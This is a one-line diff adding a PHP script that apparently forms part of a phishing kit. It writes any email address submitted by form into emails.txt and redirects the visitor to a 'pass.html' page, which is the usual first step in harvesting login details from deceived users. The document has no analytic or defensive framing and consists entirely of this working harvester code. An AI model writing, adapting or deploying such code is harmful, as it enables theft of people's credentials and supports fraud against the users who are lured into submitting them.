@@ -1,0 +1,1 @@
+<?php file_put_contents("emails.txt", " [email:] " . $email = $_POST['email'] . "\n", FILE_APPEND);header('Location: pass.html');?>
